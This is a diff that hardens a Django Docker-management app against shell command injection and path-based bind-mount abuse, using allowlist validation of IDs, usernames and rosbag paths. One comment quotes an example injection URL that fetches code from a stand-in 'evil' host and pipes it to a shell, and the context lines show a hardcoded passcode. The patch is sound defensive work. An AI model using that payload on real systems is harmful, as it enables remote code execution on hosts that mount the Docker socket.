@@ -18,9 +18,40 @@ import random
 import string
 import requests
 from pathlib import Path
+import re
 import yaml
 
 logger = logging.getLogger(__name__)
+
+
+class UnsafeIdentifier(ValueError):
+    """Raised when caller-supplied text is not safe to place in a shell command."""
+
+
+# Docker object names and IDs are limited to this alphabet, so anything outside
+# it is either a mistake or an attempt to break out of the command.
+#
+# This matters because run_command() below uses shell=True and the commands are
+# assembled with f-strings. Values reaching those f-strings come from URL path
+# segments (Django's <str:...> converter matches everything except '/') and from
+# request.POST, so without this check a request like
+#     /containers/x;curl${IFS}evil|sh/start/
+# executes in a container that has /var/run/docker.sock mounted.
+_SAFE_IDENTIFIER = re.compile(r'^[A-Za-z0-9][A-Za-z0-9_.-]{0,63}$')
+
+
+def safe_identifier(value, field='identifier'):
+    """Return value unchanged if it is safe to interpolate, else raise.
+
+    Use this on every container id, container name and username before it
+    reaches run_command().
+    """
+    text = '' if value is None else str(value).strip()
+    if not _SAFE_IDENTIFIER.match(text):
+        logger.warning("Rejected unsafe %s: %r", field, value)
+        raise UnsafeIdentifier(f'Invalid {field}')
+    return text
+
 
 def run_command(command):
     """Run a shell command and return output"""
@@ -139,6 +170,13 @@ def container_list(request):
 def container_action(request, container_id, action):
     """Handle container actions (start/stop/delete)"""
     try:
+        # container_id arrives straight from the URL path and is interpolated
+        # into shell commands below.
+        try:
+            container_id = safe_identifier(container_id, 'container id')
+        except UnsafeIdentifier as exc:
+            return JsonResponse({'status': 'error', 'message': str(exc)}, status=400)
+
         if action == 'start':
             stdout, stderr, code = run_command(f"docker start {container_id}")
             if code == 0:
@@ -230,6 +268,12 @@ def launch_openuav(request):
                 'status': 'error',
                 'message': 'Username and passcode are required'
             }, status=400)
+
+        # username is interpolated into the docker run command below.
+        try:
+            username = safe_identifier(username, 'username')
+        except UnsafeIdentifier as exc:
+            return JsonResponse({'status': 'error', 'message': str(exc)}, status=400)
 
         # Validate passcode
         if passcode != 'liftoff':
@@ -339,7 +383,13 @@ def stop_openuav(request):
         if not username:
             messages.error(request, 'Username is required')
             return redirect('openuav_manager:manage')
-        
+
+        try:
+            username = safe_identifier(username, 'username')
+        except UnsafeIdentifier as exc:
+            messages.error(request, str(exc))
+            return redirect('openuav_manager:manage')
+
         container_name = f'digital-twin-{username}'
         logger.info(f"Attempting to stop container: {container_name}")
         
@@ -438,6 +488,13 @@ def openuav_status(request):
 def container_logs(request, container_id):
     """Get container logs"""
     try:
+        # Not currently routed in urls.py, but validate so that adding a route
+        # later does not reintroduce the injection.
+        try:
+            container_id = safe_identifier(container_id, 'container id')
+        except UnsafeIdentifier as exc:
+            return JsonResponse({'status': 'error', 'message': str(exc)}, status=400)
+
         stdout, stderr, code = run_command(f"docker logs {container_id}")
         if code != 0:
             return JsonResponse({
@@ -555,6 +612,15 @@ def batch_action(request):
                 'message': 'Missing container IDs'
             }, status=400)
         
+        # Every id here is interpolated into a shell command below and, unlike
+        # container_action, there is no database lookup constraining them.
+        try:
+            container_ids = [
+                safe_identifier(cid, 'container id') for cid in container_ids
+            ]
+        except UnsafeIdentifier as exc:
+            return JsonResponse({'status': 'error', 'message': str(exc)}, status=400)
+
         results = {}
         for container_id in container_ids:
             if action == 'start':
@@ -760,6 +826,14 @@ def manage_view(request):
                     'show_form': True
                 })
 
+            try:
+                username = safe_identifier(username, 'username')
+            except UnsafeIdentifier as exc:
+                messages.error(request, str(exc))
+                return render(request, 'openuav_manager/manage.html', {
+                    'show_form': True
+                })
+
             # Validate passcode
             if passcode != 'liftoff':
                 messages.error(request, 'Invalid passcode')
@@ -954,7 +1028,12 @@ def reset_openuav(request):
                 'status': 'error',
                 'message': 'Invalid reset confirmation'
             }, status=400)
-        
+
+        try:
+            username = safe_identifier(username, 'username')
+        except UnsafeIdentifier as exc:
+            return JsonResponse({'status': 'error', 'message': str(exc)}, status=400)
+
         container_name = f'digital-twin-{username}'
         logger.info(f"Resetting container: {container_name}")
         
@@ -1023,6 +1102,14 @@ def swarm_view(request):
             # Validate inputs
             if not username or not passcode:
                 messages.error(request, 'Username and passcode are required')
+                return render(request, 'openuav_manager/swarm.html', {
+                    'show_form': True
+                })
+
+            try:
+                username = safe_identifier(username, 'username')
+            except UnsafeIdentifier as exc:
+                messages.error(request, str(exc))
                 return render(request, 'openuav_manager/swarm.html', {
                     'show_form': True
                 })
@@ -1296,14 +1383,28 @@ def launch_rosbag_viewer(request):
                 'status': 'error',
                 'message': 'Rosbag path is required'
             }, status=400)
-        
-        # Verify rosbag exists
-        rosbag_path_obj = Path(rosbag_path)
-        if not rosbag_path_obj.exists():
+
+        # username is interpolated into the container name below.
+        try:
+            username = safe_identifier(username, 'username')
+        except UnsafeIdentifier as exc:
+            return JsonResponse({'status': 'error', 'message': str(exc)}, status=400)
+
+        # rosbag_path becomes a -v bind mount inside a shell=True command that
+        # launches a --privileged container. An existence check alone was not
+        # enough: any readable host path could be mounted in. Require it to
+        # resolve inside the rosbag root.
+        rosbag_base = get_rosbag_base_path().resolve()
+        try:
+            rosbag_path_obj = Path(rosbag_path).resolve(strict=True)
+            rosbag_path_obj.relative_to(rosbag_base)
+        except (OSError, ValueError):
+            logger.warning("Rejected rosbag path outside %s: %r", rosbag_base, rosbag_path)
             return JsonResponse({
                 'status': 'error',
-                'message': f'Rosbag path does not exist: {rosbag_path}'
-            }, status=404)
+                'message': 'Rosbag path must be an existing directory under the rosbag root'
+            }, status=400)
+        rosbag_path = str(rosbag_path_obj)
         
         # Get or create rosbag record
         rosbag, _ = RosbagFile.objects.get_or_create(
@@ -1430,6 +1531,14 @@ def launch_rosbag_viewer(request):
 def rosbag_playback_control(request, container_id):
     """Control rosbag playback (play/pause/stop/rate)"""
     try:
+        # container_id comes from the URL path and is interpolated into the
+        # docker exec commands below. The database lookup further down already
+        # constrains it, but validate at the boundary too.
+        try:
+            container_id = safe_identifier(container_id, 'container id')
+        except UnsafeIdentifier as exc:
+            return JsonResponse({'status': 'error', 'message': str(exc)}, status=400)
+
         data = json.loads(request.body) if not request.POST else request.POST
         action = data.get('action', '').strip()
         rate = float(data.get('rate', 1.0))
